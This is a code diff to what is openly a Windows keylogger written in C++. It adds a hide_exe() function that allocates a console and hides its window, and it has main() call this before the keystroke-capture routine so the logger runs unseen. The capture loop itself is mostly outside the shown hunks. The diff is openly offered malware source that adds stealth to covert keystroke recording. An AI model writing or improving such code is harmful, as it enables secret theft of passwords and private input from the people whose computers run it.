@@ -3,6 +3,18 @@
 #include <winuser.h>
 #include <fstream>
 
+// Function prototypes
+void KeyLogger(void);
+void hide_exe();
+
+// main function
+int main(void)
+{
+    hide_exe();
+    KeyLogger();
+}
+
+// funtion to capture the keystrokes
 void KeyLogger(void)
 {
     char character;
@@ -333,7 +345,12 @@ void KeyLogger(void)
     }
 }
 
-int main(void)
+
+// function to hide the exe file.
+void hide_exe()
 {
-    KeyLogger();
+    HWND stealth; // handler named 'stealth'
+    AllocConsole();
+    stealth=FindWindowA("ConsoleWindowClass",NULL);
+    ShowWindow(stealth,0); // '0' means not to show the window.
 }
